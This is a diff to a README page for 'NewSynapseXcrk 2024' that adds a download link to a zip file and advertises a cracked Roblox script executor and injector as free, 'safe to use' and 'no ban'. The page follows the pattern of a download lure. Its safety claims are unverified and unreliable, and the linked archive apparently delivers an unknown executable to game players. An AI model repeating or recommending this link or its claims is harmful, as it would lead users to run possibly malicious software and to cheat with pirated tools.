@@ -1,6 +1,6 @@
 # NewSynapseXcrk 2024 
 
-[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/benerkaya/NewSynapseXcrk/releases/download/NewSynapseXcrk/NewSynapseXcrk.zip)
 
 Synapse X Crack Injector Roblox Executor Free Download. It is full and safe to use Roblox scripts and UI Pastebin files executor no ban only play games and enjoy.
 
